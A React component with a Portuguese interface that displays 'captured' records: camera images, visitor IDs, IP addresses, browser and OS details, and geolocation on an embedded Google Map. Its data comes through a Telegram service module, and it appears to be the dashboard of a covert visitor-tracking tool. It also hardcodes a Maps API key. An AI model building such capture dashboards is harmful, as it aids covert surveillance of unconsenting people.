"use client"

import { useEffect, useState } from "react"
import { CaptureData } from "@/services/telegram"
import { format } from "date-fns"
import { ptBR } from "date-fns/locale"

export function CaptureDataDisplay() {
  const [captures, setCaptures] = useState<CaptureData[]>([])

  useEffect(() => {
    // Load initial data
    const savedCaptures = localStorage.getItem('captures')
    if (savedCaptures) {
      setCaptures(JSON.parse(savedCaptures))
    }

    // Listen for storage changes
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'captures' && e.newValue) {
        setCaptures(JSON.parse(e.newValue))
      }
    }

    window.addEventListener('storage', handleStorageChange)
    return () => window.removeEventListener('storage', handleStorageChange)
  }, [])

  if (captures.length === 0) {
    return (
      <div className="text-center text-gray-500 py-8">
        Nenhum dado capturado ainda
      </div>
    )
  }

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
      {captures.map((capture, index) => (
        <div key={index} className="bg-white rounded-lg shadow-lg overflow-hidden">
          {capture.image && (
            <div className="relative aspect-video">
              <img
                src={capture.image}
                alt="Captura"
                className="w-full h-full object-cover"
              />
            </div>
          )}
          
          <div className="p-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-medium text-gray-500">
                ID: {capture.deviceInfo.visitorId}
              </span>
              <span className="text-sm text-gray-500">
                {format(new Date(capture.deviceInfo.timestamp), "PPpp", { locale: ptBR })}
              </span>
            </div>

            <div className="space-y-2">
              <div>
                <span className="text-sm font-medium text-gray-700">IP:</span>
                <span className="text-sm text-gray-600 ml-2">{capture.deviceInfo.ip}</span>
              </div>
              
              <div>
                <span className="text-sm font-medium text-gray-700">Navegador:</span>
                <span className="text-sm text-gray-600 ml-2">{capture.deviceInfo.browser}</span>
              </div>
              
              <div>
                <span className="text-sm font-medium text-gray-700">Sistema:</span>
                <span className="text-sm text-gray-600 ml-2">{capture.deviceInfo.os}</span>
              </div>

              {capture.location.latitude !== 0 && capture.location.longitude !== 0 && (
                <div className="h-48 mt-4">
                  <iframe
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    style={{ border: 0 }}
                    src={`https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${capture.location.latitude},${capture.location.longitude}`}
                    allowFullScreen
                  />
                </div>
              )}
            </div>
          </div>
        </div>
      ))}
    </div>
  )
} 